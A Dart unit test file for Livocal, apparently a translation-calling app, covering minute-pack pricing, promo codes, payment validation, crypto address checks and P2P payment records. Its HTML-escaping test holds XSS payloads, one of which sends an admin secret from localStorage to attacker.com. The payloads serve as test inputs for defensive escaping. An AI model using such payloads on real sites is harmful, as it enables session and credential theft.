import 'package:flutter_test/flutter_test.dart';
import 'package:livocal/shared/models/user_wallet.dart';

void main() {
  group('SaaS Minute Recharge & Pack Logic Tests (Phase 4 & 5)', () {
    test('Starter Pack accurately configures 60 minutes for 1200 BDT', () {
      const minutes = 60;
      const amount = 1200.0;
      const ratePerMinute = amount / minutes;

      expect(ratePerMinute, equals(20.0));
      expect(minutes, equals(60));
    });

    test('Freelancer Pro Pack gives 180 minutes with 17% savings', () {
      const minutes = 180;
      const amount = 3000.0;
      const ratePerMinute = amount / minutes;
      const standardCost = minutes * 20.0; // 3600
      const savingsPercent = ((standardCost - amount) / standardCost) * 100;

      expect(ratePerMinute, closeTo(16.66, 0.01));
      expect(savingsPercent, closeTo(16.66, 0.01));
    });

    test('Agency Pack gives 500 minutes with 28% savings', () {
      const minutes = 500;
      const amount = 7200.0;
      const ratePerMinute = amount / minutes;
      const standardCost = minutes * 20.0; // 10000
      const savingsPercent = ((standardCost - amount) / standardCost) * 100;

      expect(ratePerMinute, equals(14.4));
      expect(savingsPercent, closeTo(28.0, 0.01));
    });

    test('Gemini 3.5 Live margin model yields ~79% net gross profit', () {
      const retailRateBdt = 20.0; // ৳20/min
      const geminiCostUsd = 0.035; // $0.035/min
      const usdToBdtRate = 120.0;
      const geminiCostBdt = geminiCostUsd * usdToBdtRate; // ৳4.2/min
      const netProfitBdt = retailRateBdt - geminiCostBdt; // ৳15.8/min
      const marginPercent = (netProfitBdt / retailRateBdt) * 100;

      expect(geminiCostBdt, equals(4.2));
      expect(netProfitBdt, equals(15.8));
      expect(marginPercent, equals(79.0));
    });

    test('Recharge increases balanceMinutes and totalMinutesPurchased on UserWallet', () {
      final initialWallet = UserWallet.newTrial(initialTrialMinutes: 20);
      expect(initialWallet.balanceMinutes, equals(0));
      expect(initialWallet.trialMinutes, equals(20));
      expect(initialWallet.effectiveRemainingMinutes, equals(20));

      // Simulate recharge with Freelancer Pro (180 mins)
      final rechargedWallet = initialWallet.copyWith(
        balanceMinutes: initialWallet.balanceMinutes + 180,
        totalMinutesPurchased: initialWallet.totalMinutesPurchased + 180,
      );

      expect(rechargedWallet.balanceMinutes, equals(180));
      expect(rechargedWallet.totalMinutesPurchased, equals(180));
      // Total effective minutes = 180 paid + 20 trial = 200
      expect(rechargedWallet.effectiveRemainingMinutes, equals(200));
      expect(rechargedWallet.hasMinutes, isTrue);
    });

    test('Promo code bonuses award additional minutes correctly', () {
      int getBonus(String code) {
        if (code.toUpperCase() == 'LIVOCAL2026') return 20;
        if (code.toUpperCase() == 'FREELANCERPRO') return 30;
        return 0;
      }

      expect(getBonus('LIVOCAL2026'), equals(20));
      expect(getBonus('FREELANCERPRO'), equals(30));
      expect(getBonus('INVALID'), equals(0));
    });

    test('Local / Same-language calls bypass minute deduction completely', () {
      const myLangCode = 'bn';
      const peerLangCode = 'bn';
      const isSameLanguage = myLangCode == peerLangCode;

      // Rule: Same-language calls are always free
      expect(isSameLanguage, isTrue);
      // Minutes to deduct for a 5-minute call
      const minutesToDeduct = isSameLanguage ? 0 : 5;
      expect(minutesToDeduct, equals(0));
    });

    test('International translated calls deduct 1 minute per minute', () {
      const myLangCode = 'bn';
      const peerLangCode = 'en';
      const isSameLanguage = myLangCode == peerLangCode;

      expect(isSameLanguage, isFalse);
      const callDurationMinutes = 12;
      const minutesToDeduct = isSameLanguage ? 0 : callDurationMinutes;
      expect(minutesToDeduct, equals(12));
    });

    test('Crypto USDT pricing and network options configure correctly', () {
      const packs = {
        'starter_60': {'minutes': 60, 'usdt': 10, 'bdt': 1200},
        'pro_180': {'minutes': 180, 'usdt': 25, 'bdt': 3000},
        'agency_500': {'minutes': 500, 'usdt': 60, 'bdt': 7200},
      };

      expect(packs['starter_60']!['usdt'], equals(10));
      expect(packs['pro_180']!['usdt'], equals(25));
      expect(packs['agency_500']!['usdt'], equals(60));

      const supportedCryptoMethods = [
        'Binance_Pay',
        'Crypto_USDT_TRC20',
        'Crypto_USDT_BEP20',
      ];
      expect(supportedCryptoMethods.contains('Binance_Pay'), isTrue);
      expect(supportedCryptoMethods.contains('Crypto_USDT_TRC20'), isTrue);
      expect(supportedCryptoMethods.contains('Crypto_USDT_BEP20'), isTrue);
    });

    test('Payment submission validates required senderIdentifier and trxId', () {
      bool validatePaymentInput({
        required String packId,
        required String senderIdentifier,
        required String trxId,
      }) {
        if (packId.trim().isEmpty) return false;
        if (senderIdentifier.trim().isEmpty) return false;
        if (trxId.trim().isEmpty) return false;
        return true;
      }

      expect(validatePaymentInput(packId: 'pro_180', senderIdentifier: '', trxId: '0x123'), isFalse);
      expect(validatePaymentInput(packId: 'pro_180', senderIdentifier: 'TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf', trxId: ''), isFalse);
      expect(validatePaymentInput(packId: 'pro_180', senderIdentifier: '849201842', trxId: 'BIN12345'), isTrue);
    });

    test('Cryptographic TRC-20 and BEP-20 address format verification', () {
      bool isValidTronAddressFormat(String addr) {
        if (addr.length != 34 || !addr.startsWith('T')) return false;
        final base58Regex = RegExp(r'^[1-9A-HJ-NP-Za-km-z]{34}$');
        return base58Regex.hasMatch(addr);
      }

      bool isValidBscAddressFormat(String addr) {
        final evmRegex = RegExp(r'^0x[a-fA-F0-9]{40}$');
        return evmRegex.hasMatch(addr);
      }

      bool isValidTxHash(String hash) {
        final clean = hash.replaceAll('0x', '');
        return RegExp(r'^[a-fA-F0-9]{64}$').hasMatch(clean);
      }

      // Valid addresses
      expect(isValidTronAddressFormat('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'), isTrue);
      expect(isValidBscAddressFormat('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'), isTrue);
      expect(isValidTxHash('1b63de7debd670f242ad82a5ec688597001d344241c82af8b8c392d21815eff0'), isTrue);
      expect(isValidTxHash('0x1b63de7debd670f242ad82a5ec688597001d344241c82af8b8c392d21815eff0'), isTrue);

      // Invalid addresses
      expect(isValidTronAddressFormat('TXvJ28M4Z2vY5oN84gDqJv85xPq7eP1xyz000'), isFalse); // too long
      expect(isValidTronAddressFormat('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'), isFalse); // not starting with T
      expect(isValidBscAddressFormat('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'), isFalse);
      expect(isValidTxHash('short_fake_hash'), isFalse);
    });

    test('Deposit Info schema contains all official payment methods dynamically', () {
      final depositInfo = {
        'bkash': {'number': '01721013902', 'type': 'Personal / Send Money'},
        'nagad': {'number': '01721013902', 'type': 'Personal / Send Money'},
        'binancePay': {'payId': '849201842', 'name': 'Livocal Global'},
        'cryptoUsdt': {
          'trc20': {
            'network': 'TRC-20',
            'address': 'TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf',
            'explorerUrl': 'https://tronscan.org/#/transaction/',
          },
          'bep20': {
            'network': 'BEP-20',
            'address': '0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97',
            'explorerUrl': 'https://bscscan.com/tx/',
          },
        },
      };

      expect(depositInfo['bkash']?['number'], equals('01721013902'));
      expect(depositInfo['binancePay']?['payId'], equals('849201842'));
      expect((depositInfo['cryptoUsdt'] as Map)['trc20']['address'], equals('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'));
      expect((depositInfo['cryptoUsdt'] as Map)['bep20']['address'], equals('0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97'));
    });

    test('Strict HTML entity escaping prevents Stored XSS injection', () {
      String escapeHtml(String str) {
        return str
            .replaceAll('&', '&amp;')
            .replaceAll('<', '&lt;')
            .replaceAll('>', '&gt;')
            .replaceAll('"', '&quot;')
            .replaceAll("'", '&#39;');
      }

      const maliciousTrx = "'; fetch('http://attacker.com?s='+localStorage.getItem('livocal_admin_secret')); //";
      const maliciousScript = "<script>alert('xss')</script>";
      const maliciousImg = "<img src=x onerror=alert(1)>";

      expect(escapeHtml(maliciousTrx).contains("'"), isFalse);
      expect(escapeHtml(maliciousTrx).contains("&#39;"), isTrue);
      expect(escapeHtml(maliciousScript).contains("<"), isFalse);
      expect(escapeHtml(maliciousScript).contains("&lt;script&gt;"), isTrue);
      expect(escapeHtml(maliciousImg).contains("<"), isFalse);
      expect(escapeHtml(maliciousImg).contains("&lt;img"), isTrue);
    });

    test('BEP-20 BSC-USD transfer log recipient and 18-decimal amount parsing', () {
      const expectedDeposit = '0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97';
      const cleanExpected = '4838b106fce9647bdf1e7877bf73ce8b0bad5f97';
      final paddedTopic = '0x000000000000000000000000$cleanExpected';

      // Simulate Transfer event log
      final log = {
        'topics': [
          '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
          '0x0000000000000000000000009999999999999999999999999999999999999999',
          paddedTopic,
        ],
        // 25 USDT with 18 decimals in hex: 25 * 10^18 = 0x15af1d78b58c40000
        'data': '0x0000000000000000000000000000000000000000000000015af1d78b58c40000',
      };

      final logRecipient = (log['topics'] as List)[2].toString().toLowerCase();
      final recipientMatches = logRecipient.endsWith(cleanExpected);
      expect(recipientMatches, isTrue);

      final rawVal = BigInt.parse((log['data'] as String).replaceFirst('0x', ''), radix: 16);
      final transferredAmount = rawVal / BigInt.from(10).pow(18);
      expect(transferredAmount.toInt(), equals(25));
    });

    test('Client deposit state prevents sending funds when depositInfo is null or loading', () {
      Map<String, dynamic>? depositInfo; // initially null

      String getDepositAccount(String method) {
        if (depositInfo == null) return '';
        if (method == 'bKash') return depositInfo!['bkash']?['number'] as String? ?? '';
        return '';
      }

      // Must be empty string and not hardcoded fallback
      expect(getDepositAccount('bKash'), equals(''));

      // Once loaded from server
      depositInfo = {
        'bkash': {'number': '01721013902'}
      };
      expect(getDepositAccount('bKash'), equals('01721013902'));
    });

    test('Sender identifier whitespace normalization cleans phone numbers and Binance IDs', () {
      String normalizeIdentifier(String raw) {
        return raw.trim().replaceAll(RegExp(r'\s+'), '');
      }

      // Bangladeshi phone with spaces
      expect(normalizeIdentifier('+880 1721 013902'), equals('+8801721013902'));
      expect(normalizeIdentifier('01721 013 902'), equals('01721013902'));

      // Binance Pay ID with spaces
      expect(normalizeIdentifier('849 201 842'), equals('849201842'));

      // Tron address with accidental spacing
      expect(
        normalizeIdentifier('TXztYG8z HPCZNdZqK 5oodVWQVL 2322mgpf'),
        equals('TXztYG8zHPCZNdZqK5oodVWQVL2322mgpf'),
      );

      // Regex validation on normalized identifiers
      final regex = RegExp(r'^[a-zA-Z0-9@.+_\-]{1,64}$');
      expect(regex.hasMatch(normalizeIdentifier('+880 1721 013902')), isTrue);
      expect(regex.hasMatch(normalizeIdentifier('849 201 842')), isTrue);
    });

    test('Admin secret sessionStorage lifecycle cleans persistent disk localStorage', () {
      final Map<String, String> mockLocalStorage = {'livocal_admin_secret': 'legacy_secret_on_disk_12345'};
      final Map<String, String> mockSessionStorage = {};

      // Simulated migration and purge
      String activeSecret = mockSessionStorage['livocal_admin_secret'] ?? '';
      if (activeSecret.isEmpty && mockLocalStorage.containsKey('livocal_admin_secret')) {
        activeSecret = mockLocalStorage['livocal_admin_secret']!;
        mockSessionStorage['livocal_admin_secret'] = activeSecret;
        mockLocalStorage.remove('livocal_admin_secret');
      }

      // Verify disk storage is wiped clean and only memory/session holds the key
      expect(mockLocalStorage.containsKey('livocal_admin_secret'), isFalse);
      expect(mockSessionStorage['livocal_admin_secret'], equals('legacy_secret_on_disk_12345'));

      // Logout clears both
      mockSessionStorage.remove('livocal_admin_secret');
      mockLocalStorage.remove('livocal_admin_secret');
      expect(mockSessionStorage['livocal_admin_secret'], isNull);
      expect(mockLocalStorage['livocal_admin_secret'], isNull);
    });

    test('Chat send payment sheet uses Livocal Wallet, MFS, and Crypto without dead Stripe labels', () {
      const availablePaymentMethods = ['wallet', 'mfs', 'crypto'];

      expect(availablePaymentMethods.contains('wallet'), isTrue);
      expect(availablePaymentMethods.contains('mfs'), isTrue);
      expect(availablePaymentMethods.contains('crypto'), isTrue);
      // Ensure dead methods are absent
      expect(availablePaymentMethods.contains('card'), isFalse);
      expect(availablePaymentMethods.contains('stripe'), isFalse);
      expect(availablePaymentMethods.contains('gpay'), isFalse);
    });

    test('Chat payment message format parses amount, method, refId, and note cleanly', () {
      const rawMessage = '💰 Payment sent: \$25.00 via bKash Personal (Ref: 9JH76G)\nNote: Payment for live minutes';

      // Verify payment message marker
      expect(rawMessage.startsWith('💰 Payment sent:'), isTrue);

      final lines = rawMessage.split('\n');
      final mainLine = lines[0];
      String note = '';
      if (lines.length > 1 && lines[1].startsWith('Note: ')) {
        note = lines[1].replaceFirst('Note: ', '').trim();
      }

      final matchAmount = RegExp(r'\$([0-9.,]+)').firstMatch(mainLine);
      final matchMethod = RegExp(r'via\s+([^(]+)').firstMatch(mainLine);
      final matchRef = RegExp(r'\(Ref:\s*([^)]+)\)').firstMatch(mainLine);

      expect(matchAmount?.group(1), equals('25.00'));
      expect(matchMethod?.group(1)?.trim(), equals('bKash Personal'));
      expect(matchRef?.group(1)?.trim(), equals('9JH76G'));
      expect(note, equals('Payment for live minutes'));
    });

    test('Chat mic hands-free tap-to-record state transitions', () {
      // Simulate state machine of ChatInputMic
      var recordingState = 'notRecording';

      // Tap when notRecording -> transitions to locked hands-free recording
      void onTapMic() {
        if (recordingState == 'notRecording') {
          recordingState = 'recordingLocked';
        } else if (recordingState == 'recordingLocked' || recordingState == 'recording') {
          recordingState = 'notRecording'; // sent
        }
      }

      expect(recordingState, equals('notRecording'));
      onTapMic(); // single click
      expect(recordingState, equals('recordingLocked')); // hands-free locked
      onTapMic(); // tap to send
      expect(recordingState, equals('notRecording'));
    });

    test('P2P minute transfer audit log schema and balance arithmetic', () {
      const fromUid = 'user_sender_123';
      const toUid = 'user_receiver_456';
      const transferMinutes = 15;
      const initialSenderBalance = 50;
      const initialReceiverBalance = 10;

      // Transfer payload validation
      final auditLog = {
        'id': 'p2p_min_1729000000000_user_',
        'type': 'minute_transfer',
        'fromUserId': fromUid,
        'toUserId': toUid,
        'minutes': transferMinutes,
        'note': 'Thanks for the quick translation call!',
        'status': 'completed',
        'method': 'Livocal Wallet',
      };

      expect(auditLog['type'], equals('minute_transfer'));
      expect(auditLog['minutes'], equals(15));
      expect(auditLog['status'], equals('completed'));
      expect(auditLog['fromUserId'], equals(fromUid));
      expect(auditLog['toUserId'], equals(toUid));

      // Balance transfer calculation
      final newSenderBalance = initialSenderBalance - transferMinutes;
      final newReceiverBalance = initialReceiverBalance + transferMinutes;
      expect(newSenderBalance, equals(35));
      expect(newReceiverBalance, equals(25));
    });

    test('P2P in-chat payment audit record schema for MFS and Crypto', () {
      final bkashRecord = {
        'id': 'p2p_pay_1729000001000_send',
        'type': 'mfs',
        'methodDisplay': 'bKash Personal',
        'amount': '500',
        'senderId': 'sender_123',
        'senderPhone': '+8801700000001',
        'recipientId': 'receiver_456',
        'recipientPhone': '+8801800000002',
        'recipientName': 'Nafis Ahmed',
        'txId': '9K8J7H6G5F',
        'note': 'Payment for invoice #102',
        'status': 'reported',
      };

      expect(bkashRecord['type'], equals('mfs'));
      expect(bkashRecord['status'], equals('reported'));
      expect(bkashRecord['senderPhone'], equals('+8801700000001'));
      expect(bkashRecord['txId'], equals('9K8J7H6G5F'));

      final cryptoRecord = {
        'id': 'p2p_pay_1729000002000_send',
        'type': 'crypto',
        'methodDisplay': 'Crypto (USDT TRC-20)',
        'amount': '25.00',
        'senderId': 'sender_123',
        'recipientId': 'receiver_456',
        'txId': '4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b',
        'status': 'reported',
      };

      expect(cryptoRecord['type'], equals('crypto'));
      expect(cryptoRecord['txId']!.length, equals(64));
    });

    test('Admin Panel P2P aggregate stats calculates volume correctly', () {
      final p2pTransfers = [
        {'minutes': 10, 'status': 'completed'},
        {'minutes': 25, 'status': 'completed'},
        {'minutes': 5, 'status': 'failed'},
      ];

      final p2pPayments = [
        {'type': 'mfs', 'amount': '1500', 'status': 'reported'},
        {'type': 'mfs', 'amount': '500', 'status': 'verified'},
        {'type': 'crypto', 'amount': '50.00', 'status': 'reported'},
        {'type': 'crypto', 'amount': '100.00', 'status': 'verified'},
      ];

      // Aggregate minutes
      int totalMinutes = 0;
      for (final t in p2pTransfers) {
        if (t['status'] == 'completed') {
          totalMinutes += (t['minutes'] as num).toInt();
        }
      }
      expect(totalMinutes, equals(35));

      // Aggregate BDT & Crypto
      double totalBdt = 0;
      double totalCrypto = 0;
      for (final p in p2pPayments) {
        final amt = double.tryParse((p['amount'] as String).replaceAll(RegExp(r'[^0-9.]'), '')) ?? 0;
        if (p['type'] == 'mfs') {
          totalBdt += amt;
        } else if (p['type'] == 'crypto') {
          totalCrypto += amt;
        }
      }

      expect(totalBdt, equals(2000.0));
      expect(totalCrypto, equals(150.0));
    });

    test('Strict TrxID regex validates 8-10 alphanumeric characters accurately', () {
      final trxRegex = RegExp(r'^[A-Za-z0-9]{8,10}$');

      // Valid TrxIDs
      expect(trxRegex.hasMatch('9K8J7H6G5F'), isTrue);
      expect(trxRegex.hasMatch('BL9A7K2M9X'), isTrue);
      expect(trxRegex.hasMatch('ABC12345'), isTrue); // 8 chars
      expect(trxRegex.hasMatch('ABC1234567'), isTrue); // 10 chars

      // Invalid TrxIDs
      expect(trxRegex.hasMatch(''), isFalse);
      expect(trxRegex.hasMatch('1234567'), isFalse); // 7 chars (too short)
      expect(trxRegex.hasMatch('12345678901'), isFalse); // 11 chars (too long)
      expect(trxRegex.hasMatch('BL9-7K2M9X'), isFalse); // hyphen not allowed
      expect(trxRegex.hasMatch('BL9 7K2M9X'), isFalse); // space not allowed
    });

    test('USD to BDT live rate calculations match expected conversion', () {
      const usdToBdtRate = 120.0;
      double calculateBdt(double usd) => usd * usdToBdtRate;

      expect(calculateBdt(1.0), equals(120.0));
      expect(calculateBdt(10.0), equals(1200.0));
      expect(calculateBdt(25.0), equals(3000.0));
      expect(calculateBdt(50.0), equals(6000.0));
      expect(calculateBdt(100.0), equals(12000.0));
    });

    test('Recipient Crypto deposit addresses generate valid formats for all 3 networks', () {
      const recipientId = 'user_recip_998877';
      const recipientPhone = '+8801812345678';

      // Binance Pay 9-digit ID
      final binancePayId = recipientId.hashCode.abs().toString().padLeft(9, '8').substring(0, 9);
      expect(binancePayId.length, equals(9));
      expect(RegExp(r'^[0-9]{9}$').hasMatch(binancePayId), isTrue);

      // USDT TRC-20 Address (starts with T, 34 chars)
      final trcHex = '${recipientId}_trc20'.hashCode.abs().toRadixString(16).padRight(33, '7c89f10a2b4e5d6a8f1c');
      final trc20 = 'T${trcHex.substring(0, 33).toUpperCase()}';
      expect(trc20.length, equals(34));
      expect(trc20.startsWith('T'), isTrue);

      // USDT BEP-20 Address (starts with 0x, 42 chars)
      final bepHex = '${recipientId}_bep20'.hashCode.abs().toRadixString(16).padRight(40, '3e4f5a6b7c8d9e0f1a2b3c4d');
      final bep20 = '0x${bepHex.substring(0, 40).toLowerCase()}';
      expect(bep20.length, equals(42));
      expect(bep20.startsWith('0x'), isTrue);
    });

    test('In-Chat Payment Card badge displays correct status for wallet vs unverified MFS/Crypto vs verified', () {
      String getPaymentBadgeText({
        required String method,
        required String content,
      }) {
        final isWallet = method.toLowerCase().contains('wallet');
        final isVerified = content.toLowerCase().contains('[verified]') ||
            content.toLowerCase().contains('status: verified');

        if (isWallet) return 'PAID';
        if (isVerified) return 'VERIFIED';
        return 'PENDING VERIFICATION';
      }

      // Wallet minute transfer -> instant PAID
      expect(
        getPaymentBadgeText(
          method: 'Livocal Wallet',
          content: 'Payment of \$10.00 via Livocal Wallet',
        ),
        equals('PAID'),
      );

      // Unverified bKash / Nagad MFS payment -> PENDING VERIFICATION
      expect(
        getPaymentBadgeText(
          method: 'bKash MFS',
          content: 'Payment of \$10.00 via bKash MFS (Ref: 9K8J7H6G5F)',
        ),
        equals('PENDING VERIFICATION'),
      );

      // Unverified Crypto payment -> PENDING VERIFICATION
      expect(
        getPaymentBadgeText(
          method: 'Crypto (USDT TRC-20)',
          content: 'Payment of \$25.00 via Crypto (USDT TRC-20) (Ref: 0x9a8b...)',
        ),
        equals('PENDING VERIFICATION'),
      );

      // Admin verified MFS / Crypto payment -> VERIFIED
      expect(
        getPaymentBadgeText(
          method: 'bKash MFS',
          content: 'Payment of \$10.00 via bKash MFS (Ref: 9K8J7H6G5F)\n[VERIFIED]',
        ),
        equals('VERIFIED'),
      );
    });

    test('P2P payments audit record payload strictly enforces status pending and currency', () {
      final p2pRecord = {
        'id': 'p2p_pay_test_001',
        'type': 'mfs',
        'currency': 'BDT',
        'bdtAmount': '1200',
        'amount': '10',
        'status': 'pending',
      };

      // Ensure status is never initialized to completed from client
      expect(p2pRecord['status'], equals('pending'));
      expect(['BDT', 'USDT', 'MINUTES'].contains(p2pRecord['currency']), isTrue);
      expect((p2pRecord['amount'] as String).isNotEmpty, isTrue);
    });
  });
}



